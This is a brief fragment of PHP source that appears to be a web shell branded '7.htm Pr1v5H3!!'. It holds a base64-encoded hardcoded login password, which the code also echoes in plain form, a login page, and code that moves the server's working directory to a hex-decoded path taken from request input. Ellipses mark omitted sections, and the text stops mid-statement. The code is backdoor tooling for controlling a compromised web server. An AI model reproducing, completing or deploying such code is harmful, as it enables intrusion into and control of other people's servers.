...
$gcw = "getcwd";
$inipass = "QFhpbmFtaTo2MjIyISEqIQ==";
if(isset($_7['x1nam1'])){
	echo "<div class='text-center text-muted'>@Xinami:6222!!*!</div>";
}
function Login() {
?>
<!DOCTYPE HTML>
...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>7.htm Pr1v5H3!!</h4></a>";
			if(isset($_7['path'])){
				$path = unhex($_7['path']);
				chdir($path);
			}else{
